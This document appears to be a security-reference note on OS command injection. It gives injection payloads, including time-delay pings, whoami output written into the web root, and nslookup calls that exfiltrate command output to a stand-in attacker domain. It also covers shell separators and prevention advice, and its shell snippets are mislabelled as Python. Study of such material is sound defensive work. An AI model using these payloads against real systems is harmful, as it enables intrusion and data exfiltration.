---
technique: "OS Command Injection"
family: "injection"
severity_hint: "critical"
tags: ["Remote Code Execution"]
source: "_raw/Web attacks/Web Attacks/OS Command Injection.md"
source_sha256: "4d4924b2ffab810d7fbd5796ad7693925745ec699e66a041b6d958cb72deb9ed"
curator_version: 2
review_status: imported-unreviewed
---

# OS Command Injection

> Family: **injection** · Severity hint: **critical** · Tags: Remote Code Execution
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: & echo aiwefwlguh &`
- `python: stockreport.pl & echo aiwefwlguh & 29`
- `python: mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`
- `python: & ping -c 10 127.0.0.1 &`
- `python: & whoami > /var/www/static/whoami.txt &`
- `python: & nslookup kgji2ohoyw.web-attacker.com &`
- `python: & nslookup `whoami`.kgji2ohoyw.web-attacker.com &`
- `python: wwwuser.kgji2ohoyw.web-attacker.com`

## Playbook (operator notes)

# OS Command Injection

## Executing arbitrary commands

- Consider a shopping application that lets the user view whether an item is in stock in a particular store
- `https://insecure-website.com/stockStatus?productID=381&storeID=29`
- To provide the stock information, the application must query various legacy systems
- For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments
- `stockreport.pl 381 29`
- An attacker can submit the following input to execute an arbitrary command

```python
& echo aiwefwlguh &
```

- If this input is submitted in the `productID` parameter, then the command executed by the application is

```python
stockreport.pl & echo aiwefwlguh & 29
```

## Useful commands

## Blind OS command injection vulnerabilities

- Consider a web site that lets users submit feedback about the site
- The user enters their email address and feedback message
- The server-side application then generates an email to a site administrator containing the feedback

```python
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

- The output from the `mail` command (if any) is not returned in the application's responses, and so using the `echo` payload would not be effective

### Detecting blind OS command injection using time delays

- You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond
- The `ping` command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run

```python
& ping -c 10 127.0.0.1 &
```

- This command will cause the application to ping its loopback network adapter for 10 seconds

### Exploiting blind OS command injection by redirecting output

- You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser
- For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input

```python
& whoami > /var/www/static/whoami.txt &
```

### Exploiting blind OS command injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

- You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques

```python
& nslookup kgji2ohoyw.web-attacker.com &
```

- The out-of-band channel also provides an easy way to exfiltrate the output from injected commands

```python
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

- This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command

```python
wwwuser.kgji2ohoyw.web-attacker.com
```

## Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:

- `;`
- Newline (`0x0a` or `\\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- ``` injected command ```
- `$(` injected command `)`

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.

## How to prevent OS command injection attacks

By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.

If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:

- Validating against a whitelist of permitted values.
- Validating that the input is a number.
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.

## Source
Original note: `_raw/Web attacks/Web Attacks/OS Command Injection.md`
